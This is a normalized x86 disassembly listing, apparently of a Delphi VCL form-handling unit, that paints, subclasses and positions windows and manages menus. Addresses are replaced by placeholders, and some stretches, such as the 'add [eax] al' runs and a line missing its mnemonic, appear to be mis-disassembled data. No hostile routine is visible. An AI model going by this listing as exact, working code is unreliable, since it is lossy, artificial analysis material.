mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_44df64
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44e440
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44e48c
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_44dfa4
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_44e172
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d528
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438f44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4345d4
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4333cc
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_44df18
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d528
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_44e440
test eax eax
je r-xdata
push ebp
call sub_44df18
pop ecx
push ebp
call sub_44df18
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_44df64
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44b284
jmp r-xdata
sub_44e184
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_44c44c
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_44e1f0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_44cae8
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov eax ebx
call sub_41a300
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_43b290
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_4380b4
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_43b290
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a2d4
call sub_44858c
mov edx esi
mov eax ebx
call sub_41a2d4
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
sub_44e288
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_44e305
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_44e310
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_438830
sub_44e33c
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_438830
xor edx edx
jmp r-xdata
mov eax esi
call sub_44c5c8
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_44e374
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_434294
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_438830
sub_44e3b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4343a0
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_44e40c
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_431970
sub_44e440
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_451fb0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_451f9c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_44e48c
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_451fb0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_451f9c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_44e4dc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413898
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_44e50c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_43b290
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_451f80
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_451f80
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_44e4dc
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_451f80
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_451f6c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4139f4
call sub_4030f8
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_451f6c
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_451f6c
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_451f6c
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_44e610
push ebx
mov ebx eax
mov eax ebx
call sub_44e608
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_421c80
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44e638
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4387e8
mov dl 0x1
mov eax esi
call sub_44e99c
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_44ea18
mov edx eax
mov eax esi
call sub_434c30
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_438984
mov dl 0x1
mov eax esi
call sub_44d9bc
sub_44e6b8
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_43b290
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_444b88
mov edi eax
mov eax ebp
call sub_43b290
push eax
call DrawMenuBar
sub_44e734
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419dac
xor edx edx
mov eax ebx
call sub_446520
sub_44e758
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_44e6b8
mov eax edx
mov edx ebx
call sub_419dac
sub_44e780
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e946
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_451fb0
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_4480d4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_451f9c
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419dac
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_451f9c
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
mov eax ebx
call sub_43b594
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_43b290
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_44e6b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e94d
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
mov dl 0x1
mov eax ebx
call sub_44f844
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_43b290
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_43b290
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_43b290
mov edx eax
mov eax esi
call sub_4480d4
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_43b290
push eax
call SetMenu
sub_44e968
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e954
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_44e9c4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44e9b8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_44ea30
push ebx
mov ebx eax
mov eax ebx
call sub_43a8a8
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_44ea18
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44ea18
mov edx eax
mov eax ebx
call sub_434c30
mov edx 0xff00000f
mov eax ebx
call sub_434c30
pop ebx
retn
sub_44eab4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_43b290
push eax
call ShowWindow
sub_44eaf4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e50c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_44e50c
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_451f80
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_451f6c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_44e50c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_451f80
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_451f6c
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c54
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c3c
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_451f6c
call sub_451c3c
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c3c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c88
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c54
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c3c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c88
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c70
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_451f6c
call sub_451c70
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c54
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c3c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c88
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c3c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c88
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c70
push eax
mov edx esi
mov eax [ rw-data ]
call sub_451f6c
call sub_451c54
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_44ee48
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_44c3fc
mov edx esi
mov eax edi
call sub_4517ec
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_44eef7 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4380b4
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4380b4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_44f059
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44c40c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43b290
push eax
call SendMessageA
mov eax ebx
call sub_44f9b8
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43b290
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_434494
push eax
mov eax ebx
call sub_4344d8
push eax
mov eax ebx
call sub_43b290
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_4067dc
mov [ ebx + 0x254 ] eax
push ebx
push sub_44dfa4
call sub_41ad6c
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_444b88
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_43b290
push eax
call SetWindowPos
jmp r-xdata
sub_44f1a6
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44f2d1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_438418
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
